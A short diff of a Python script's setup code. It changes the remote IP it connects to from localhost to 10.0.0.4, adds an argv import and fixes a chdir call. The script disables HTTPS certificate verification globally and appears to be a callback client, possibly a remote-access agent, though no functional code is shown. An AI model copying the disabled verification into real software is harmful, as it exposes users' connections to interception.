@@ -6,7 +6,7 @@ from importlib import util
 from time import time, sleep
 from os import remove, path, getpid, kill, getlogin, name, chdir, getcwd
 from datetime import datetime
-from sys import exit,exc_info
+from sys import exit,exc_info,argv
 from signal import SIGTERM
 from random import randint, uniform, choice
 from datetime import datetime
@@ -25,7 +25,7 @@ else:
     ssl._create_default_https_context = _create_unverified_https_context
 
 UUID = "c60a59df-c3e1-11ea-a17a-bc14ef68ef25"   #python -c 'import uuid; print(uuid.uuid1())'
-remote_ip = '127.0.0.1'
+remote_ip = '10.0.0.4'
 remote_port = 8081
 server_sni_hostname = ''
 VERBOSE = True
@@ -41,7 +41,7 @@ RECONNECT_ATTEMPTS = 5 #immediately upon disconnect
 if VERBOSE:
     #set working directory to script location
     print("Current Working Directory: ",getcwd())
-chdir(path.dirname(sys.argv[0]))
+chdir(path.dirname(argv[0]))
 if VERBOSE:
     print("New Working Directory: ",getcwd())
 try:
